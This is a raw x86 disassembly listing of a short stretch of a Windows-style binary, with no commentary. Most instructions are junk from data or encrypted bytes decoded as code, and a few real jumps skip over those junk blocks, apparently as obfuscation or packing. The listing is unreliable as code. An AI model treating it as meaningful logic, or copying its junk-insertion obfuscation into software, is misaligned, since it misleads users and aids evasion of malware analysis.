  40f3ae:	xor    esp,edi
  40f3b0:	and    eax,0xe3e7120
  40f3b5:	mov    edi,0x9a27efd3
  40f3ba:	mov    ds:0xc2f0ee3,eax
  40f3bf:	xor    eax,0xe65eca93
  40f3c4:	popf   
  40f3c5:	mov    ch,0xda
  40f3c7:	adc    eax,0x28285780
  40f3cc:	dec    ecx
  40f3cd:	dec    ecx
  40f3ce:	sahf   
  40f3cf:	mov    dh,0x23
  40f3d1:	adc    DWORD PTR [edx-0x35],eax
  40f3d4:	fild   DWORD PTR [esp+eax*1]
  40f3d7:	jmp    0x791:0x12fe696b
  40f3de:	push   0xffffff84
  40f3e0:	add    edi,edi
  40f3e2:	jb     0x40f44c
  40f3e4:	aad    0xb9
  40f3e6:	shr    DWORD PTR [edi],0xb0
  40f3e9:	leave  
  40f3ea:	inc    ecx
  40f3eb:	in     al,0x3b
  40f3ed:	retf   
  40f3ee:	and    dl,ch
  40f3f0:	or     eax,0x66c9c6b4
  40f3f5:	fstp   QWORD PTR [esi-0x3cfca19c]
  40f3fb:	pop    ebx
  40f3fc:	leave  
  40f3fd:	ret    0x8
  40f400:	push   ebp
  40f401:	mov    ebp,esp
  40f403:	push   ecx
  40f404:	mov    DWORD PTR ds:0x433727,0x6a14
  40f40e:	push   ecx
  40f40f:	xor    ecx,edx
  40f411:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  40f418:	jmp    0x40f6e7
  40f41d:	call   0xa1f0:0x6df6cd0b
  40f424:	push   ebx
  40f425:	inc    ebx
  40f426:	push   edi
  40f427:	dec    ecx
  40f428:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f429:	imul   ecx,esi,0x6d
  40f42c:	shr    BYTE PTR [edi-0x53818155],0x7c
  40f433:	jle    0x40f4b3
  40f435:	scas   eax,DWORD PTR es:[edi]
  40f436:	dec    edx
  40f437:	add    BYTE PTR [edx],dl
  40f439:	call   0x8c81:0xba30ac6
  40f440:	arpl   WORD PTR [esi+0x62b4d49d],cx
  40f446:	sbb    esi,DWORD PTR [ecx]
  40f448:	aam    0x6b
  40f44a:	es jnp 0x40f41d
  40f44d:	ins    DWORD PTR es:[edi],dx
  40f44e:	mov    esp,0x69f13d22
  40f453:	pop    ebx
  40f454:	fisubr DWORD PTR [eax+esi*1]
  40f457:	push   ecx
  40f458:	xchg   ebp,eax
  40f459:	sbb    dl,cl
  40f45b:	xor    al,0xfe
  40f45d:	hlt    
  40f45e:	test   eax,0xceab5b51
  40f463:	jns    0x40f4e2
  40f465:	ror    DWORD PTR [ebp-0x3d25c9ee],0xef
  40f46c:	aad    0xfe
  40f46e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f46f:	test   BYTE PTR [ebp+0x39],bh
  40f472:	aaa    
  40f473:	and    BYTE PTR [edx+0x7d],0x8a
  40f477:	mov    ebx,0x7aa9e5a0
  40f47c:	cwde   
  40f47d:	inc    esp
  40f47e:	rcl    DWORD PTR [eax+0x554bae90],1
  40f484:	out    0x22,al
  40f486:	adc    cl,0x24
  40f489:	and    ah,BYTE PTR [ebp+0x4de3bc67]
  40f48f:	mov    al,ds:0x3bc4241a
  40f494:	inc    edx
  40f495:	inc    ebx
  40f496:	das    
  40f497:	outs   dx,BYTE PTR ds:[esi]
  40f498:	fsubr  DWORD PTR [edi]
  40f49a:	adc    al,0x67
  40f49c:	dec    esp
  40f49d:	sbb    esi,DWORD PTR [ecx-0x4c51d49e]
  40f4a3:	jg     0x40f4a1
  40f4a5:	inc    edx
  40f4a6:	and    ecx,ebx
  40f4a8:	or     al,0xc0
  40f4aa:	fcom   QWORD PTR [ebx+0x4]
  40f4ad:	out    0x64,eax
  40f4af:	into   
  40f4b0:	push   edi
  40f4b1:	add    edi,DWORD PTR [edx]
  40f4b3:	ret    
  40f4b4:	fs out dx,al
  40f4b6:	push   edi
  40f4b7:	mov    esp,0xc4e2f3b1
  40f4bc:	retf   0x1383
  40f4bf:	ret    0xe5fe
  40f4c2:	jmp    0x7644:0xf7f470fa
  40f4c9:	and    al,0x48
  40f4cb:	push   ebx
  40f4cc:	sub    DWORD PTR [edx],0xffffff8d
  40f4cf:	retf   0x8a11
  40f4d2:	mov    esi,0x7069b08a
  40f4d7:	ja     0x40f4b0
  40f4d9:	cmp    DWORD PTR [ebx+eiz*8],ecx
  40f4dc:	std    
  40f4dd:	jne    0x40f4c5
  40f4df:	push   edi
  40f4e0:	and    ecx,DWORD PTR [edx]
  40f4e2:	xor    DWORD PTR [esi+0x74],ecx
  40f4e5:	add    cl,0xc1
  40f4e8:	pop    esp
  40f4e9:	aaa    
  40f4ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4eb:	aad    0xbb
  40f4ed:	dec    edx
  40f4ee:	loopne 0x40f4b4
  40f4f0:	mov    eax,ds:0x6f88bcf0
  40f4f5:	dec    edi
  40f4f6:	add    al,0xcb
  40f4f8:	pop    ebx
  40f4f9:	xchg   esp,eax
  40f4fa:	inc    ecx
  40f4fb:	call   0xa667d148
  40f500:	mov    esi,0xef549d44
  40f505:	mov    dh,BYTE PTR [eax+eax*2+0x5a]
  40f509:	dec    edx
  40f50a:	mov    ch,BYTE PTR [ecx+0x4ad56e3c]
  40f510:	ja     0x40f580
  40f512:	dec    esi
  40f513:	pop    ebx
  40f514:	add    BYTE PTR [edi+0x47],al
  40f517:	inc    ecx
  40f518:	mov    dl,0x71
  40f51a:	jne    0x40f55e
  40f51c:	ficom  WORD PTR [edx+0x48]
  40f51f:	(bad)  
  40f520:	jae    0x40f554
  40f522:	js     0x40f525
  40f524:	repz and BYTE PTR [ebp+0x46665376],ch
  40f52b:	or     BYTE PTR [ebp+0x60eaa2ce],ch
  40f531:	jno    0x40f541
  40f533:	mov    ds:0x26fe48fe,al
  40f538:	dec    esp
  40f539:	ins    BYTE PTR es:[edi],dx
  40f53a:	add    ecx,DWORD PTR ds:0xc109d463
  40f540:	jle    0x40f508
  40f542:	aaa    
  40f543:	bound  ebx,QWORD PTR [edx-0x3c8e3012]
  40f549:	iret   
  40f54a:	mov    edi,0x817c356e
  40f54f:	xchg   ebx,eax
  40f550:	adc    edi,DWORD PTR [esi]
  40f552:	add    bl,al
  40f554:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40f556:	stos   DWORD PTR es:[edi],eax
  40f557:	ficomp DWORD PTR [esi-0x77]
  40f55a:	test   DWORD PTR [esi-0x4a7b63c5],eax
  40f560:	pop    ebp
  40f561:	mov    edi,0xfca84189
  40f566:	sub    eax,ecx
  40f568:	adc    eax,DWORD PTR [edx-0x23]
  40f56b:	mov    ebx,0x378d2306
  40f570:	cld    
  40f571:	pop    ebp
  40f572:	push   ds
  40f573:	push   ebx
  40f574:	pop    es
  40f575:	add    edx,ebx
  40f577:	push   ebx
  40f578:	push   ebx
  40f579:	xchg   esp,eax
  40f57a:	cdq    
  40f57b:	retf   
  40f57c:	add    esi,eax
  40f57e:	mov    eax,0x968d277d
  40f583:	or     edx,DWORD PTR [ebx+0x5402b3e5]
  40f589:	ja     0x40f515
  40f58b:	push   es
  40f58c:	sbb    al,0xef
  40f58e:	adc    eax,0x502c4098
  40f593:	mov    eax,ds:0x400e4ca1
  40f598:	aaa    
  40f599:	xor    al,0xe
  40f59b:	and    dh,BYTE PTR [ebx]
  40f59d:	push   esi
  40f59e:	cmp    BYTE PTR [eax+0x2fad7497],0x5a
  40f5a5:	cld    
  40f5a6:	lahf   
  40f5a7:	test   DWORD PTR [bp+di-0x3003],ebp
  40f5ac:	xchg   BYTE PTR [esi-0x71],ah
  40f5af:	push   ebx
  40f5b0:	inc    ebx
  40f5b1:	stos   DWORD PTR es:[edi],eax
  40f5b2:	popf   
  40f5b3:	js     0x40f619
  40f5b5:	das    
  40f5b6:	mov    WORD PTR [esi+ecx*1+0x12d80f59],es
  40f5bd:	outs   dx,DWORD PTR ds:[esi]
  40f5be:	xchg   esp,eax
  40f5bf:	mov    edi,0x5374300
  40f5c4:	push   ebp
  40f5c5:	cs hlt 
  40f5c7:	jge    0x40f585
  40f5c9:	cvtpi2ps xmm7,QWORD PTR [ebp+edi*2-0x2432a4b0]
  40f5d1:	js     0x40f59a
  40f5d3:	push   0x35
  40f5d5:	nop
  40f5d6:	cmp    eax,0x9f9db113
  40f5db:	jns    0x40f599
  40f5dd:	loopne 0x40f620
  40f5df:	pop    eax
  40f5e0:	sub    bh,BYTE PTR [esi+0x3e]
  40f5e3:	pop    edi
  40f5e4:	lahf   
  40f5e5:	mov    al,ds:0x644f49f3
  40f5ea:	xor    al,0x53
  40f5ec:	pop    esp
  40f5ed:	mov    ds:0x50d76b3b,al
  40f5f2:	ja     0x40f5ad
  40f5f4:	imul   ebp,edx,0xfd4e03ef
  40f5fa:	ss or  eax,0xb7236af
  40f600:	sub    ebx,edx
  40f602:	dec    ebp
  40f603:	jne    0x40f677
  40f605:	rol    esp,cl
  40f607:	fwait
  40f608:	mov    bl,0x7d
  40f60a:	not    DWORD PTR [ebp-0x51]
  40f60d:	add    cl,bh
  40f60f:	out    0x1d,eax
  40f611:	jae    0x40f647
  40f613:	pop    esp
  40f614:	lods   eax,DWORD PTR ds:[esi]
  40f615:	add    edx,0xffffff94
  40f618:	mov    ebx,0x6fd0374d
  40f61d:	je     0x40f5b5
  40f61f:	adc    DWORD PTR ds:0x5097af0b,esp
  40f625:	mov    ebp,DWORD PTR [eax-0x46ecb36]
  40f62b:	pop    ecx
  40f62c:	out    dx,al
  40f62d:	mov    ah,BYTE PTR [eax]
  40f62f:	or     BYTE PTR [edx+0x525a51e7],dh
  40f635:	call   DWORD PTR [ebp+0x5a1414e2]
  40f63b:	dec    edx
  40f63c:	fnstenv [edi-0x1]
  40f63f:	xlat   BYTE PTR ds:[ebx]
  40f640:	je     0x40f5c2
  40f642:	pop    esp
  40f643:	xchg   ebp,eax
  40f644:	inc    eax
  40f645:	mov    WORD PTR [esi],ss
  40f647:	push   ss
  40f648:	rcr    bh,cl
  40f64a:	dec    ebx
  40f64b:	int    0x73
  40f64d:	jb     0x40f626
  40f64f:	inc    DWORD PTR ds:0x17320417
  40f655:	jnp    0x40f637
  40f657:	sub    al,BYTE PTR [edx-0x36291694]
  40f65d:	push   edx
  40f65e:	nop
  40f65f:	mov    ah,BYTE PTR [edi-0x43]
  40f662:	adc    dh,BYTE PTR [ecx-0xd]
  40f665:	sub    edx,ebx
  40f667:	sti    
  40f668:	push   es
  40f669:	loop   0x40f6dc
  40f66b:	pop    ds
  40f66c:	push   edi
  40f66d:	rcl    DWORD PTR [eax],0x5d
  40f670:	and    al,0x91
  40f672:	pop    ebx
  40f673:	xchg   esp,eax
  40f674:	or     edi,edx
  40f676:	ins    BYTE PTR es:[edi],dx
  40f677:	ror    BYTE PTR [esi+0x3],cl
  40f67a:	xor    DWORD PTR [edx+0x45e82abc],0x9fe8a2a3
  40f684:	sub    DWORD PTR [eax-0x1c4e7fc7],ebp
  40f68a:	mov    eax,ds:0x8b60196f
  40f68f:	add    DWORD PTR [ebx],eax
  40f691:	ror    ebp,cl
  40f693:	xchg   ecx,eax
  40f694:	out    0xe0,al
  40f696:	and    eax,0x39eb1c
  40f69b:	sbb    ebx,DWORD PTR [ebp+esi*8-0x3c]
  40f69f:	test   dh,ah
  40f6a1:	or     al,0x22
  40f6a3:	inc    edx
  40f6a4:	mov    WORD PTR [ebx+0x1d],ss
  40f6a7:	lods   eax,DWORD PTR ds:[esi]
  40f6a8:	adc    DWORD PTR [ecx-0x6186e8c6],eax
  40f6ae:	mov    ch,0xbe
  40f6b0:	jmp    0x40f6f2
  40f6b2:	mov    ch,0xf1
  40f6b4:	shl    BYTE PTR [ebp+0x1a7a37e3],cl
  40f6ba:	push   es
  40f6bb:	jmp    0xd2e2b60c
  40f6c0:	inc    ecx
  40f6c1:	outs   dx,BYTE PTR ds:[esi]
  40f6c2:	sbb    DWORD PTR [esi+0x5c],ebx
  40f6c5:	rol    DWORD PTR [esi+0x56],1
  40f6c8:	loopne 0x40f6eb
  40f6ca:	and    al,0x7a
  40f6cc:	sub    al,0xc4
  40f6ce:	push   0xfafbf1cc
  40f6d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6d4:	hlt    
  40f6d5:	jp     0x40f697
  40f6d7:	les    esp,FWORD PTR [edi]
  40f6d9:	xlat   BYTE PTR ds:[ebx]
  40f6da:	enter  0x9b98,0xd3
  40f6de:	adc    BYTE PTR ds:0xf881049f,cl
  40f6e4:	xor    al,0x84
  40f6e6:	rol    bh,0x45
  40f6e9:	cld    
  40f6ea:	xor    al,BYTE PTR [ebp+0x2d81f89c]
  40f6f0:	daa    
  40f6f1:	aaa    
  40f6f2:	inc    ebx
  40f6f3:	add    BYTE PTR [edx+0x5c],dh
  40f6f6:	add    BYTE PTR [eax],al
  40f6f8:	mov    eax,DWORD PTR [ebp-0x4]
  40f6fb:	add    DWORD PTR ds:0x4336e7,0x767c
  40f705:	jmp    0x40f9d4
  40f70a:	ins    BYTE PTR es:[edi],dx
  40f70b:	xchg   BYTE PTR [eax+0x70d870dc],ah
  40f711:	xchg   esi,eax
  40f712:	in     eax,0xdf
  40f714:	or     eax,ebp
  40f716:	jno    0x40f735
  40f718:	mov    al,ds:0x7eb6dd80
  40f71d:	jle    0x40f6cb
  40f71f:	jl     0x40f79f
  40f721:	jle    0x40f788
  40f723:	pushf  
  40f724:	sub    BYTE PTR [ecx+ecx*2],dh
  40f727:	int    0x45
  40f729:	and    ecx,DWORD PTR [ecx]
  40f72b:	icebp  
  40f72c:	cmp    ah,dl
  40f72e:	inc    ecx
  40f72f:	jno    0x40f71e
  40f731:	shl    DWORD PTR [ecx-0x2f],0x44
  40f735:	mov    esi,0x95b0099a
  40f73a:	fstp   DWORD PTR [ebx+0x38]
  40f73d:	adc    eax,0x75ac0b1c
  40f742:	fadd   DWORD PTR [ebx-0x498aaba6]
  40f748:	adc    BYTE PTR [eax+0x370333e],dh
  40f74e:	retf   
  40f74f:	pop    ebp
  40f750:	arpl   WORD PTR [ecx-0x245bb36c],cx
  40f756:	test   al,0xb2
  40f758:	and    BYTE PTR [eax+0x2005b7fb],ch
  40f75e:	push   cs
  40f75f:	out    0xce,eax
  40f761:	or     ebx,DWORD PTR [ecx]
  40f763:	mov    edi,0xe6e1f980
  40f768:	xlat   BYTE PTR ds:[ebx]
  40f769:	out    dx,eax
  40f76a:	aad    0x17
  40f76c:	adc    bh,bl
  40f76e:	mov    esp,0xbd10635e
  40f773:	jnp    0x40f708
  40f775:	dec    eax
  40f776:	in     al,dx
  40f777:	ins    BYTE PTR es:[edi],dx
  40f778:	mov    ecx,0x69635c2f
  40f77d:	mov    bh,BYTE PTR [esi+0x1d]
  40f780:	pop    eax
  40f781:	call   0x9cd6:0xbfb5887a
  40f788:	ins    DWORD PTR es:[edi],dx
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	and    al,0x5
  40f78c:	imul   ebp,DWORD PTR [esi-0x12],0xffffffe5
  40f790:	div    edx
  40f792:	and    BYTE PTR [esi-0x1c],dh
  40f795:	outs   dx,BYTE PTR ds:[esi]
  40f796:	sbb    BYTE PTR [ebp+eiz*8-0x2a],dl
  40f79a:	mov    dl,al
  40f79c:	dec    esi
  40f79d:	in     al,dx
  40f79e:	push   edi
  40f79f:	mov    cl,dl
  40f7a1:	pop    es
  40f7a2:	addr16 jnp 0x40f7a1
  40f7a5:	adc    eax,0x7727dbcd
  40f7aa:	cmp    BYTE PTR [ebp+edx*2+0x7ef76b0c],bl
  40f7b1:	pusha  
  40f7b2:	cmp    BYTE PTR [ecx],0x85
  40f7b5:	fcomp  QWORD PTR [esi+0x31]
  40f7b8:	xchg   edi,eax
  40f7b9:	hlt    
  40f7ba:	(bad)  
  40f7bb:	mov    al,ds:0xf236292f
  40f7c0:	lahf   
  40f7c1:	mov    al,ds:0x62036f7d
  40f7c6:	(bad)  
  40f7c7:	ds (bad) 
  40f7c9:	push   esp
  40f7ca:	pop    edi
  40f7cb:	xchg   ebp,eax
  40f7cc:	jl     0x40f782
  40f7ce:	jno    0x40f7ac
  40f7d0:	mov    ah,0xed
  40f7d2:	sub    eax,0x23a9da21
  40f7d7:	cdq    
  40f7d8:	bswap  esp
  40f7da:	ds mov al,0x38
  40f7dd:	imul   DWORD PTR [edi-0x3f]
  40f7e0:	aas    
  40f7e1:	jmp    0x40f7ab
  40f7e3:	adc    BYTE PTR [esp+esi*4],0x21
  40f7e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7e8:	mov    ds:0x91859dbe,al
  40f7ed:	and    al,0xc1
  40f7ef:	xchg   DWORD PTR [edx],eax
  40f7f1:	xchg   edx,eax
  40f7f2:	pop    edi
  40f7f3:	dec    esi
  40f7f4:	adc    ebx,esp
  40f7f6:	mov    al,0xa2
  40f7f8:	and    BYTE PTR [esi+0x771e5e26],bh
  40f7fe:	mov    ds:0xf91e982c,al
  40f803:	jae    0x40f7fc
  40f805:	out    dx,eax
  40f806:	dec    ebp
  40f807:	xor    cl,dh
  40f809:	inc    ecx
  40f80a:	lock or eax,0x4321978b
  40f810:	sub    al,0x32
  40f812:	push   edx
  40f813:	pop    ds
  40f814:	call   0x81e0231
  40f819:	popf   
  40f81a:	test   BYTE PTR [ebx-0x5b0c18b5],dh
  40f820:	pop    ecx
  40f821:	das    
  40f822:	int    0x7d
  40f824:	jecxz  0x40f7ea
  40f826:	iret   
  40f827:	data16 aas 
  40f829:	(bad)  
  40f82a:	and    edx,DWORD PTR [edx-0x77]
  40f82d:	mov    ebp,0x590dfb1e
  40f832:	popf   
  40f833:	pop    ss
  40f834:	push   ebp
  40f835:	clc    
  40f836:	call   0x16e3:0xff9ee75b
  40f83d:	and    ch,BYTE PTR [ecx+edx*1-0x3c]
  40f841:	int3   
  40f842:	mov    gs,WORD PTR [eax-0x7e]
  40f845:	stos   BYTE PTR es:[edi],al
  40f846:	push   ecx
  40f847:	fild   WORD PTR [ecx]
  40f849:	push   edi
  40f84a:	inc    ebp
  40f84b:	jb     0x40f81c
  40f84d:	loop   0x40f809
  40f84f:	ss xchg esi,eax
  40f851:	ror    DWORD PTR [ecx],1
  40f853:	popf   
  40f854:	sub    dh,dh
  40f856:	inc    edi
  40f857:	jg     0x40f8cb
  40f859:	and    edx,DWORD PTR [esi]
  40f85b:	sahf   
  40f85c:	mov    ?,WORD PTR [eax-0x5d]
  40f85f:	xor    DWORD PTR [ecx+0x78],ebp
  40f862:	push   edx
  40f863:	psrad  mm6,QWORD PTR [eax]
  40f866:	in     al,0x5
  40f868:	imul   edx,DWORD PTR [eax],0x8247302a
  40f86e:	jecxz  0x40f844
  40f870:	std    
  40f871:	add    al,0xeb
  40f873:	fisttp QWORD PTR [ebx+ecx*2]
  40f876:	cs stc 
  40f878:	sbb    dh,BYTE PTR [esp+eiz*4]
  40f87b:	sub    cl,BYTE PTR [esi-0x71]
  40f87e:	ins    DWORD PTR es:[edi],dx
  40f87f:	pop    esp
  40f880:	pusha  
  40f881:	loop   0x40f8b6
  40f883:	adc    al,0xc0
  40f885:	push   eax
  40f886:	cmp    esp,ecx
  40f888:	inc    edx
  40f889:	cmp    DWORD PTR [ecx-0x3d],esi
  40f88c:	sub    esi,DWORD PTR [ebx+esi*2-0x2]
  40f890:	(bad)  
  40f891:	call   0x96276e40
  40f896:	fdivr  QWORD PTR [esi+0x5cd6e31c]
  40f89c:	out    0xdb,al
  40f89e:	rol    BYTE PTR [edi],0xd5
  40f8a1:	ja     0x40f890
  40f8a3:	xchg   al,ah
  40f8a5:	lea    esp,[eax-0x128ca06e]
  40f8ab:	lea    ebx,[edx+0x54]
  40f8ae:	imul   esp,DWORD PTR [eax],0x6c
  40f8b1:	push   cs
  40f8b2:	fs pop esi
  40f8b4:	push   ebp
  40f8b5:	sbb    al,0x49
  40f8b7:	jp     0x40f8c3
  40f8b9:	jle    0x40f846
  40f8bb:	mov    ah,0xfa
  40f8bd:	neg    DWORD PTR [ecx-0x6b]
  40f8c0:	cmp    BYTE PTR [ebp-0x15dd139b],bl
  40f8c6:	fdiv   QWORD PTR [eax]
  40f8c9:	in     eax,0xfb
  40f8cb:	add    eax,0x45b89e29
  40f8d0:	pop    ss
  40f8d1:	addr16 xor eax,0xf4861fe3
  40f8d7:	adc    eax,0xc9600c6c
  40f8dc:	and    dh,BYTE PTR [ecx-0x4322aa6f]
  40f8e2:	push   ss
  40f8e3:	lods   al,BYTE PTR fs:[esi]
  40f8e5:	mov    al,0x25
  40f8e7:	hlt    
  40f8e8:	adc    al,0x99
  40f8ea:	mov    esi,0x4957d545
  40f8ef:	pusha  
  40f8f0:	and    eax,ecx
  40f8f2:	imul   eax,DWORD PTR [ecx-0x3a676c64],0xffffff98
  40f8f9:	and    BYTE PTR [edi],bl
  40f8fb:	icebp  
  40f8fc:	imul   ebp,ebp,0xffffff8a
  40f8ff:	ror    BYTE PTR [ebp+0x38],0x25
  40f903:	pusha  
  40f904:	mov    esp,0xb6a63dcb
  40f909:	fimul  WORD PTR [ecx+0x3e5860bb]
  40f90f:	pop    eax
  40f910:	into   
  40f911:	sbb    ebp,DWORD PTR [ebx-0x6]
  40f914:	aad    0xe5
  40f916:	retf   0x4ac3
  40f919:	sub    al,0x54
  40f91b:	jae    0x40f901
  40f91d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f91e:	in     al,0x1c
  40f920:	mov    esi,0x9712dedf
  40f925:	retf   0x956f
  40f928:	iret   
  40f929:	xchg   DWORD PTR [eax],eax
  40f92b:	call   0xe67:0x3cecd208
  40f932:	sar    DWORD PTR [eax+ebp*4-0x37],1
  40f936:	or     ah,bh
  40f938:	jb     0x40f999
  40f93a:	sbb    ebx,edx
  40f93c:	xchg   ebp,eax
  40f93d:	inc    esp
  40f93e:	jnp    0x40f8d8
  40f940:	mov    cl,0x7e
  40f942:	aam    0xe8
  40f944:	jns    0x40f9b5
  40f946:	data16 mov bl,0xf4
  40f949:	push   cs
  40f94a:	push   ds
  40f94b:	mov    cl,0xf9
  40f94d:	(bad)  
  40f94e:	repz (bad) 
  40f950:	jb     0x40f969
  40f952:	ss sub eax,0xfad3bc2
  40f958:	push   ecx
  40f959:	(bad)  
  40f95b:	mov    ds:0xaca8f2c6,eax
  40f960:	pushf  
  40f961:	jne    0x40f97f
  40f963:	inc    esi
  40f964:	shl    cl,0xcc
  40f967:	and    edx,DWORD PTR [edi-0x2c]
  40f96a:	cmp    al,0x31
  40f96c:	mov    ebp,0x87a6870e
  40f971:	dec    ebp
  40f972:	cli    
  40f973:	fsubr  DWORD PTR [ecx-0x58]
  40f976:	mov    ebx,0xa3f1a22b
  40f97b:	(bad)  
  40f97c:	dec    ebp
  40f97d:	cmp    BYTE PTR [eax-0x13c3cd62],0xe1
  40f984:	sub    BYTE PTR [ebx-0xd],0xc1
  40f988:	xor    edx,DWORD PTR [edi]
  40f98a:	mov    cl,0x1c
  40f98c:	inc    eax
  40f98d:	lahf   
  40f98e:	ss or  eax,0x9dcdc7b8
  40f994:	adc    DWORD PTR [edi],eax
  40f996:	sbb    DWORD PTR [edx],ebp
  40f998:	leave  
  40f999:	es int3 
  40f99b:	mov    dl,0x8
  40f99d:	stc    
  40f99e:	sbb    eax,0x2e30a757
  40f9a3:	cmp    esp,edx
  40f9a5:	pop    esp
  40f9a6:	inc    ebp
  40f9a7:	mov    eax,0x83036377
  40f9ac:	sub    ch,bl
  40f9ae:	mov    dh,0xd6
  40f9b0:	in     al,dx
  40f9b1:	(bad)  
  40f9b2:	sub    BYTE PTR [ebp-0x9],bh
  40f9b5:	int3   
  40f9b6:	imul   ebx,DWORD PTR [eax*8-0x378bf86c],0xffffff87
  40f9be:	pop    esp
  40f9bf:	pop    es
  40f9c0:	or     bl,bl
  40f9c2:	push   ecx
  40f9c3:	jnp    0x40f9c0
  40f9c5:	xor    al,0xd3
  40f9c7:	(bad)  
  40f9c8:	mov    al,ds:0xbee0749c
  40f9cd:	inc    edx
  40f9ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9cf:	shl    BYTE PTR [edi+0x560539c7],0x13
  40f9d6:	xor    eax,0x433677
  40f9db:	mov    esi,DWORD PTR [ebp-0x8]
  40f9de:	movzx  ecx,BYTE PTR ds:0x43367b
  40f9e5:	adc    DWORD PTR ds:0x433733,ecx
  40f9eb:	mov    edx,0x7510854
  40f9f0:	xor    eax,edx
  40f9f2:	xor    ecx,0x76d3
  40f9f8:	xor    esi,edx
  40f9fa:	mov    ecx,0x32729b
  40f9ff:	jmp    0x40fcce
  40fa04:	mov    eax,ds:0x696d6976
  40fa09:	jno    0x40f9ac
  40fa0b:	jb     0x40fa43
  40fa0d:	inc    eax
  40fa0e:	pop    eax
  40fa0f:	outs   dx,DWORD PTR ds:[esi]
  40fa10:	jo     0x40f9c3
  40fa12:	dec    ebx
  40fa13:	push   edi
  40fa14:	or     esi,DWORD PTR [ebp+0x7cac7e7e]
  40fa1a:	jle    0x40fa9a
  40fa1c:	push   0x4e29af85
  40fa21:	aas    
  40fa22:	or     ch,BYTE PTR [ecx+0x544df900]
  40fa28:	push   edx
  40fa29:	sahf   
  40fa2a:	test   DWORD PTR [ebp+0x6c8e1165],0xf8b031ad
  40fa34:	adc    eax,0x8c359380
  40fa39:	fbld   TBYTE PTR [ebx]
  40fa3b:	mov    bl,BYTE PTR [eax-0x52]
  40fa3e:	and    cl,bh
  40fa40:	or     edi,esp
  40fa42:	or     eax,0x9f93ca01
  40fa47:	push   0xdec511b4
  40fa4c:	(bad)  [edi]
  40fa4e:	pop    edx
  40fa4f:	inc    ecx
  40fa50:	iret   
  40fa51:	pop    es
  40fa52:	mov    cl,0x84
  40fa54:	ds adc ecx,ebx
  40fa57:	mov    eax,esp
  40fa59:	pop    edx
  40fa5a:	sub    dl,BYTE PTR [esi]
  40fa5c:	or     DWORD PTR [ecx-0x6ef3206d],edx
  40fa62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa63:	sbb    dl,BYTE PTR [eax]
  40fa65:	xchg   esp,eax
  40fa66:	and    BYTE PTR ds:0x607db6e9,bh
  40fa6c:	push   es
  40fa6d:	sub    BYTE PTR [edx+0x5d7c287d],0x41
  40fa74:	or     al,0xf9
  40fa76:	outs   dx,BYTE PTR ds:[esi]
  40fa77:	push   ss
  40fa78:	in     al,dx
  40fa79:	mov    ah,0x41
  40fa7b:	or     ch,BYTE PTR [ebx]
  40fa7d:	neg    BYTE PTR [ebp-0x4096b8c7]
  40fa83:	jnp    0x40fa50
  40fa85:	xor    eax,0x9cb464c8
  40fa8a:	push   edx
  40fa8b:	xor    ecx,ebp
  40fa8d:	lds    esp,FWORD PTR [di]
  40fa90:	jmp    0x2460:0xebc31acc
  40fa97:	stc    
  40fa98:	jmp    0xf0a:0x714f326f
  40fa9f:	outs   dx,BYTE PTR ds:[esi]
  40faa0:	jmp    0x78a3:0x5ddb38db
  40faa7:	je     0x40fab6
  40faa9:	jg     0x40fad5
  40faab:	pop    esi
  40faac:	(bad)  
  40faad:	enter  0x8cdb,0xd3
  40fab1:	cmp    DWORD PTR [esi+ebp*2],0xffffff95
  40fab5:	dec    eax
  40fab6:	sub    BYTE PTR [edx],0x47
  40fab9:	shl    BYTE PTR [esi+ebp*8+0x2f0ea590],0xd6
  40fac1:	pop    esi
  40fac2:	nop
  40fac3:	mov    bh,BYTE PTR [edx-0x7a44654e]
  40fac9:	test   eax,0xefd0bb9f
  40face:	js     0x40fad1
  40fad0:	xor    BYTE PTR [ebx],bh
  40fad2:	loope  0x40fa74
  40fad4:	in     eax,dx
  40fad5:	cwde   
  40fad6:	mov    esp,0x45337f32
  40fadb:	cmp    BYTE PTR [esi+0x6b],dh
  40fade:	mov    esp,0x5c57c694
  40fae3:	fxch   st(1)
  40fae5:	mov    edx,0xc0a1a8dd
  40faea:	pop    edx
  40faeb:	pop    eax
  40faed:	jo     0x40faa1
  40faef:	mov    ds:0x3aae37f4,al
  40faf4:	loopne 0x40fb04
  40faf6:	mov    ebp,0x589ba06c
  40fafb:	lock mov ah,0xb4
  40fafe:	pop    eax
  40faff:	mov    cl,0x1b
  40fb01:	fdiv   DWORD PTR ss:[eax+esi*4]
  40fb05:	loope  0x40fab6
  40fb07:	mov    edx,ebp
  40fb09:	jge    0x40fb2a
  40fb0b:	mov    al,ds:0x937b1f65
  40fb10:	xlat   BYTE PTR ds:[ebx]
  40fb11:	(bad)  
  40fb12:	or     ah,BYTE PTR [edx-0xc]
  40fb15:	mov    esi,0xba2e3247
  40fb1a:	add    eax,0x5bbd0d6f
  40fb1f:	push   0x23
  40fb21:	ins    BYTE PTR es:[edi],dx
  40fb22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb23:	ret    
  40fb24:	inc    edi
  40fb25:	outs   dx,DWORD PTR ds:[esi]
  40fb26:	dec    esi
  40fb27:	js     0x40fb0e
  40fb29:	sbb    DWORD PTR [esi-0x1c35a649],eax
  40fb2f:	mov    dh,0xd2
  40fb31:	mov    ebx,0xd323f70a
  40fb36:	shl    DWORD PTR [eax-0x34640816],1
  40fb3c:	iret   
  40fb3d:	sbb    al,0xe
  40fb3f:	cwde   
  40fb40:	les    ecx,FWORD PTR [edx+0x77]
  40fb43:	lea    ebx,ds:0x226da7cc
  40fb4a:	(bad)  
  40fb4b:	pop    edi
  40fb4c:	js     0x40fba4
  40fb4e:	mov    esp,0x56c79dae
  40fb53:	pusha  
  40fb54:	nop
  40fb55:	rcl    bh,cl
  40fb57:	push   esi
  40fb58:	iret   
  40fb59:	jmp    0x86ef07d7
  40fb5e:	xchg   esi,eax
  40fb5f:	dec    edi
